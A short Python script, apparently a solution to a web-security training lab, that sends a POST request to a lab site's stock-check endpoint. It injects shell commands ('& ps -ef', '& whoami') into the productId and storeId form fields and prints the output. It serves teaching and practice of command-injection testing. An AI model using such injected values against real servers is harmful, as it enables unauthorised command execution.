import requests
from bs4 import BeautifulSoup

# See URL below for more details
# https://codelabs.cs.pdx.edu/labs/W2.1_cmd_sql_injection/index.html?index=..%2F..cs495#0

site = "ac9b1f681fb1b860803f322800db0072.web-security-academy.net"

s = requests.Session()
stock_post_url = f'https://{site}/product/stock'
post_data = {
    'productId' : '& ps -ef',
    'storeId' : '& 	whoami'
}
resp = s.post(stock_post_url, data=post_data)
print(resp.text)